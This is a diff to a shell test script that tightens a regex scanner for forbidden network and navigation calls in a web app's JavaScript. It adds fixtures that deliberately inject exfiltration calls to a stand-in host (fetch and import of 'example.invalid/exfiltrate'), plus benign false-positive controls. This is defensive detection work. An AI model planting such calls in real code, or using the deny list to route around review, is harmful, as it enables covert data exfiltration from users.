@@ -494,9 +494,26 @@ echo "static scan (app.js): forbidden channels and wording"
 #      "new". The explicit `[^[:alnum:]_$]` class treats `$` as an
 #      identifier character on both sides, closing that gap for good
 #      instead of chasing one more `\b` variant.
+#   3. (Codex round-6 finding) the TERMINAL identifier in each member-access
+#      alternative (`open`, `href`, `assign`, `replace`, the bare
+#      `document.location`) had a right boundary applied to everything
+#      EXCEPT itself, so a longer, unrelated property name starting with
+#      that word — `window.opened`, `location.hrefCache`,
+#      `location.assignment()`, `document.locationCache` — still
+#      substring-matched. Each now also carries `FORBIDDEN_ID_R` after its
+#      own terminal word. (`window.location=` is naturally exempt: it
+#      already requires a literal `=` immediately after "location", which a
+#      longer property name like "locationCache" can never be immediately
+#      followed by.)
+#   4. (Codex round-6 finding) `fetch\(`/`import\(` required the `(`
+#      immediately after the keyword with NO whitespace, but flattening
+#      inserts exactly one space for a statement reformatted across the
+#      call parenthesis itself (`fetch\n("/x")` -> `fetch ("/x")`), which a
+#      still-executing dynamic call can trivially be split across. Both now
+#      allow `[[:space:]]*` before their `(`.
 FORBIDDEN_ID_L='(^|[^[:alnum:]_$])'
 FORBIDDEN_ID_R='([^[:alnum:]_$]|$)'
-FORBIDDEN_JS_RE="${FORBIDDEN_ID_L}fetch\\(|${FORBIDDEN_ID_L}XMLHttpRequest${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}sendBeacon${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}WebSocket${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}EventSource${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}ServiceWorker${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}serviceWorker${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}new[[:space:]]+Worker${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}importScripts${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}import\\(|${FORBIDDEN_ID_L}window[[:space:]]*\\.[[:space:]]*open|${FORBIDDEN_ID_L}window[[:space:]]*\\.[[:space:]]*location[[:space:]]*=[^=]|${FORBIDDEN_ID_L}location[[:space:]]*\\.[[:space:]]*href|${FORBIDDEN_ID_L}location[[:space:]]*\\.[[:space:]]*assign|${FORBIDDEN_ID_L}location[[:space:]]*\\.[[:space:]]*replace|${FORBIDDEN_ID_L}document[[:space:]]*\\.[[:space:]]*location|(^|[^.[:alnum:]_\$])location[[:space:]]*=[^=]|\\.innerHTML[[:space:]]*="
+FORBIDDEN_JS_RE="${FORBIDDEN_ID_L}fetch[[:space:]]*\\(|${FORBIDDEN_ID_L}XMLHttpRequest${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}sendBeacon${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}WebSocket${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}EventSource${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}ServiceWorker${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}serviceWorker${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}new[[:space:]]+Worker${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}importScripts${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}import[[:space:]]*\\(|${FORBIDDEN_ID_L}window[[:space:]]*\\.[[:space:]]*open${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}window[[:space:]]*\\.[[:space:]]*location[[:space:]]*=[^=]|${FORBIDDEN_ID_L}location[[:space:]]*\\.[[:space:]]*href${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}location[[:space:]]*\\.[[:space:]]*assign${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}location[[:space:]]*\\.[[:space:]]*replace${FORBIDDEN_ID_R}|${FORBIDDEN_ID_L}document[[:space:]]*\\.[[:space:]]*location${FORBIDDEN_ID_R}|(^|[^.[:alnum:]_\$])location[[:space:]]*=[^=]|\\.innerHTML[[:space:]]*="
 
 # Flattens the whole file to one line (newlines -> spaces) before matching,
 # so a statement split across lines — e.g.
@@ -563,12 +580,14 @@ check_forbidden_js "$APP_JS" && ok "the real app.js has no forbidden channel to 
 
 NET_MUTATIONS=(
   'fetch("https://example.invalid/exfiltrate");'
+  $'fetch\n("https://example.invalid/exfiltrate");'
   'window.location = "https://example.invalid/";'
   $'window.location =\n  "https://example.invalid/";'
   $'window\n  .location =\n  "https://example.invalid/";'
   'new WebSocket("wss://example.invalid");'
   $'new\n  Worker("worker.js");'
   'window.open("https://example.invalid/");'
+  $'import\n("https://example.invalid/exfiltrate.mjs");'
 )
 NET_ALL_CAUGHT=1
 for mutation in "${NET_MUTATIONS[@]}"; do
@@ -577,7 +596,7 @@ for mutation in "${NET_MUTATIONS[@]}"; do
   printf '\n%s\n' "$mutation" >> "$mutant_file"
   check_forbidden_js "$mutant_file" && NET_ALL_CAUGHT=0
 done
-[[ "$NET_ALL_CAUGHT" -eq 1 ]] && ok "mutation witness (network/external-navigation channel): fetch, single-line/multiline/dot-split window.location assignment, WebSocket, split new Worker, and window.open are each individually detected" || bad "mutation witness (network/external-navigation channel) missed at least one injected channel"
+[[ "$NET_ALL_CAUGHT" -eq 1 ]] && ok "mutation witness (network/external-navigation channel): fetch (plain and paren-split), single-line/multiline/dot-split window.location assignment, WebSocket, split new Worker, window.open, and paren-split import() are each individually detected" || bad "mutation witness (network/external-navigation channel) missed at least one injected channel"
 
 # D2 — false-positive control: ordinary, non-navigating code that merely
 # mentions "location" as a property name, a read, or a comparison must NOT
@@ -608,6 +627,14 @@ BENIGN_LOCATION_SNIPPETS=(
   # closed by the same both-sided-boundary fix): an identifier merely
   # ending in "fetch" is not a call to the forbidden global.
   'function prefetchData() { return 1; }'
+  # Codex round-6 finding: the TERMINAL identifier in each member-access
+  # alternative had no right boundary, so a longer, unrelated property name
+  # starting with that word substring-matched.
+  'function inspect(window) { return window.opened; }'
+  'function inspect(location) { return location.hrefCache; }'
+  'function inspect(document) { return document.locationCache; }'
+  'location.assignment();'
+  'location.replacement();'
 )
 BENIGN_ALL_CLEAN=1
 for snippet in "${BENIGN_LOCATION_SNIPPETS[@]}"; do
@@ -616,7 +643,7 @@ for snippet in "${BENIGN_LOCATION_SNIPPETS[@]}"; do
   printf '\n%s\n' "$snippet" >> "$benign_file"
   check_forbidden_js "$benign_file" || BENIGN_ALL_CLEAN=0
 done
-[[ "$BENIGN_ALL_CLEAN" -eq 1 ]] && ok "false-positive control: a plain window.location read/comparison, an unrelated .location property, a string literal, and a coincidental cross-line \"new...Worker\" substring all pass cleanly (no navigation or worker construction is actually performed)" || bad "the forbidden-channel sensor false-positives on ordinary, non-navigating code"
+[[ "$BENIGN_ALL_CLEAN" -eq 1 ]] && ok "false-positive control: plain reads/comparisons, unrelated properties, string literals, \$-containing identifiers, a coincidental cross-line \"new...Worker\" substring, and longer property names sharing a prefix with a forbidden term all pass cleanly" || bad "the forbidden-channel sensor false-positives on ordinary, non-navigating code"
 
 # E — removed simulation disclaimer.
 MUTANT_HTML_NODISCLAIMER="$TMP_DIR/index.mutant-nodisclaimer.html"
